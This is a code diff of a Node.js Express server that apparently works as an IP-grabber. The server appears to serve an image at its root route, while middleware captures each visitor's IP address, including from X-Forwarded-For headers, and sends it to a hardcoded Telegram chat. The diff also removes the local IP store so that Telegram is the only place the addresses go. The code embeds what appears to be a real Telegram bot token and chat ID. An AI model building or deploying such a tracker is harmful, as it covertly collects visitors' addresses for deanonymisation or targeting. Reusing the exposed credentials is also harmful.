@@ -1,20 +1,17 @@
 const express = require('express');
 const app = express();
 const axios = require('axios');
-const TelegramBot = require('node-telegram-bot-api');
+const TelegramBot = require('node-telegram-bot-api'); // Import the Telegram Bot library
 
-// Create a new Telegram bot instance using your bot token
+// Use the 'trust proxy' setting to capture client's IP behind proxy
+app.set('trust proxy', true);
+
+// Initialize the Telegram Bot with your bot token
 const bot = new TelegramBot('6985024526:AAFdGkUe-T6Nm1MAwDU4S9Ci-Y100bloN5A', { polling: false });
 
-// Create an array to store received IP addresses
-const receivedIPs = [];
-
 app.use((req, res, next) => {
-    const clientIp = req.ip;
+    const clientIp = req.ip || req.headers['x-forwarded-for']; // Capture client's IP
     console.log(`IP-адрес посетителя: ${clientIp}`);
-
-    // Store the client's IP address in the array
-    receivedIPs.push(clientIp);
 
     // Send the client's IP address to your Telegram bot
     bot.sendMessage('565711735', `Client IP: ${clientIp}`)
@@ -40,11 +37,6 @@ app.get('/', async (req, res) => {
         console.error(error);
         res.status(500).send('Ошибка загрузки изображения');
     }
-});
-
-// Add a route to view the stored IP addresses
-app.get('/view-ips', (req, res) => {
-    res.json({ receivedIPs });
 });
 
 const port = process.env.PORT || 3000;
